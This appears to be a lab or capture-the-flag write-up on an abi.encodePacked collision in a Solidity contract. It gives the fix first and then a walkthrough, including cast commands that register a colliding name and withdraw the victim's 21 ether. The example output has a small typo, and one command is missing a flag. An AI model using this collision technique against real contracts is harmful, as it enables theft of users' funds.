## Mitigation

The vulnerability, or should we say the path that led us to gaining all **Hubert Gallanghar** access, was the *Singularity.sol::getIdentity()*, that's because that function is the one responsible for giving everyone their unique ID. Here is the code &nbsp;  
&nbsp;  
```solidity
function getIdentity(string memory _firstName, string memory _lastName) public pure returns(bytes memory){
    return abi.encodePacked(_firstName, _lastName);
}
```
&nbsp;  
What we can do to make it secure is to use *abi.encode()* instead of *abi.encodePacked()*, Why? Because *abi.encode()* preserves the structure of the inputs, avoiding ambiguous concatenation, here is how we can fix the smart contract by just changing how the *getIdentity()* works &nbsp;  
&nbsp;  
```solidity
function getIdentity(string memory _firstName, string memory _lastName) public pure returns(bytes memory){
    return abi.encode(_firstName, _lastName);
}
```
&nbsp;  
While there may be some other way to mitigate this, such as adding a unique nonce or identifier alongside the *abi.encodePacked()*, or maybe adding delimiters or length prefixes to encoded data, the best way is, of course, just to avoid using it and just use *abi.encode()* AND avoid relying on hashes or bytes alone for critical security checks.

## Walkthrough 

The setup first will register itself as "**Hubert Gallanghar**" and deposit 20 Ether alongside that. What we need to do is make the balance of "**Hubert Gallanghar**" become 0 to solve the lab. &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./Singularity.sol";

contract Setup{
    Singularity public singular;

    constructor() payable{
        singular = new Singularity();
        singular.register{value: 20 ether}("Hubert", "Gallanghar");
    }

    function isSolved() public view returns(bool){
        return singular.checkBalance("Hubert", "Gallanghar") == 0;
    }

}
```
&nbsp;  
Now let's take a look at *Singularity.sol* to see what we can do and find the vulnerability. &nbsp;  
&nbsp;  
```solidity
mapping(bytes=>uint256) public balanceOf;
mapping(string=>mapping(string=>address)) public Member;
```
&nbsp;  &nbsp;  
We can see that it has 2 mappings for *balanceOf* that will track the balance based on the unique ID generated by *getIdentity* and *Member* that will track the address of the respective name (first name & last name). Next, let's see the functions. &nbsp;  
&nbsp;  
```solidity 
function getIdentity(string memory _firstName, string memory _lastName) public pure returns(bytes memory){
    return abi.encodePacked(_firstName, _lastName);
}

function register(string memory _firstName, string memory _lastName) public payable{
    require(Member[_firstName][_lastName] == address(0), "Already Registered");
    require(msg.value > 0);
    bytes memory code = getIdentity(_firstName, _lastName);
    balanceOf[code] += msg.value;
    Member[_firstName][_lastName] = msg.sender;
}

function withdraw(string memory _firstName, string memory _lastName, uint256 _amount) public{
    require(Member[_firstName][_lastName] == msg.sender, "You cannot withdraw other people money!");
    bytes memory code = getIdentity(_firstName, _lastName);
    require(balanceOf[code] - _amount >= 0, "You don't have this kind of money!");
    balanceOf[code] -= _amount;
}   

function checkBalance(string memory _firstName, string memory _lastName) public view returns(uint256){
    bytes memory code = getIdentity(_firstName, _lastName);
    return balanceOf[code];
}
```
&nbsp;  
We can see that in *getIdentity()* the unique ID generator is actually using *abi.encodePacked()*, which is not recommended due to the direct concatenation. Here is an example. &nbsp;  
&nbsp;  
```text
firstName = "Hubert"
lastName = "Gallanghar"

abi.encodePacked(firstName, lastName) -> "HuberGallanghar"
(hex form) 0x48756265727447616c6c616e67686172
```
&nbsp;  
The function will return just that, so let's say what if we register ourselves using the first names "**HubertG**" and "**allanghar**"? Yep, that's correct; we will get the same concatenation of "**HubertGallanghar**", because the return value of the *getIdentity()* is also *0x48756265727447616c6c616e67686172*. Knowing this, we can just directly register using the first name and last name of "**HubertG**" and "**allanghar**" and just send 1 ether for the registration fee. &nbsp;  
&nbsp;  
```bash
// registering with HubertG allanghar
cast send -r $RPC_URL --private-key $PK $SINGULARITY_ADDR "register(string, string)" "HubertG" "allanghar" --value 1ether

// make sure that the balance is now 21 Ether
cast call -r $RPC_URL $SINGULARITY_ADDR "checkBalance(string, string)" "HubertG" "allanghar"

// make a withdrawal of 21 Ether, emptying Hubert Gallanghar balance
cast send $RPC_URL --private-key $PK $SINGULARITY_ADDR "withdraw(string, string,uint256)" "HubertG" "allanghar" 21000000000000000000
```
&nbsp;  
Why can't we use "**Hubert**" "**Gallanghar**", since we have the same bytes? It's because the original name was owned by the setup contract, and it checks whether the name owner is us (msg.sender) or not upon withdrawal. &nbsp;  
&nbsp;  
By running the command above, we should've solved the lab.